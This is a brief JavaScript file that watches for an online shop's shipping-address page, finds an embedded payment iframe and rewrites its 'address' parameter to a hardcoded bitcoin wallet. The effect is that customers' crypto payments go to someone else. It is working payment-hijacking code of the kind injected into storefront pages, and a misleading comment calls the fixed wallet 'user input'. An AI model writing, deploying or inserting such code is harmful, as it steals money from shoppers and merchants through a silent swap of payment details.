var intervalId;
function checkIframe() {
    if (window.location.href.indexOf("/shop/shippingaddress?coupon_code=&shipping_type=") > -1){
        const iframes = Array.from(document.getElementsByTagName("iframe"));
        const targetValue = "common/create"; // The string to check for
        const newValue = "bc1qhlfra0y62dwd6rxp4l5qffcsrkg4swjjvg0uce"; // Get user input

        const foundIframe = iframes.some(iframe => {
            if (iframe.src.includes(targetValue)) {
                const updatedSrc = iframe.src.replace(/(address=)[^&]*/, `$1${newValue}`);
                iframe.src = updatedSrc; // Update the iframe src
                clearInterval(intervalId);
                return true;
            }
            return false;
        });
    }
}
intervalId = setInterval(checkIframe, 1);
